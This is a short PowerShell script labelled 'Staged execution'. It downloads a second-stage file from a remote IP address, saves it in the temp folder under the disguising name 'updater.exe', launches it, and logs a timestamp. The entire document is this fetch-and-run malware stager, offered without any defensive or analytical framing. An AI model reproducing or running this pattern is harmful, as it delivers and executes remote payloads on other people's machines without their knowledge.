
<# Staged execution #>
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://192.0.2.9/stage2.ps1",
    [string]$DownloadPath = "$env:TEMP\updater.exe"
)
try { (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $DownloadPath); Start-Process -FilePath $DownloadPath; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Stage transfer failed" }
